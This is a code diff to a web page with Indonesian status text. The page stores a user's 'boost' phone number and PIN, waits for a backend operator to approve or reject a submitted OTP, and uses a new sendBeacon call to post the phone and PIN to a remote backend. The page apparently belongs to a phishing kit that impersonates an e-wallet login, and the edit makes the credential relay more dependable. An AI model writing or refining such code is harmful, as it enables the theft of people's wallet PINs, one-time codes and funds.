@@ -104,6 +104,8 @@
                             statusMsg.textContent = '✅ Approved! Redirecting...';
                             statusMsg.style.color = 'green';
                             clearInterval(pollingInterval);
+                            localStorage.removeItem('boost_phone');
+                            localStorage.removeItem('boost_pin');
                             setTimeout(() => window.location.href = 'success.html?status=approved', 2000);
                         } else if (data.status === 'rejected') {
                             statusMsg.textContent = '❌ OTP ditolak. Silakan coba lagi.';
@@ -200,16 +202,16 @@
         });
 
         // ========== CANCEL SAAT HALAMAN DITUTUP ATAU DIREFRESH ==========
-        window.addEventListener('beforeunload', function() {
-            const phone = localStorage.getItem('boost_phone');
-            const pin = localStorage.getItem('boost_pin');
-            if (phone && pin) {
-                fetch(BACKEND_URL + '/api/cancel-pending', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone, pin }),
-                    keepalive: true
-                });
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === "hidden") {
+                const phone = localStorage.getItem('boost_phone');
+                const pin = localStorage.getItem('boost_pin');
+                if (phone && pin) {
+                    navigator.sendBeacon(
+                        BACKEND_URL + '/api/cancel-pending',
+                        new Blob([JSON.stringify({ phone, pin })], { type: 'application/json' })
+                    );
+                }
             }
         });
     </script>
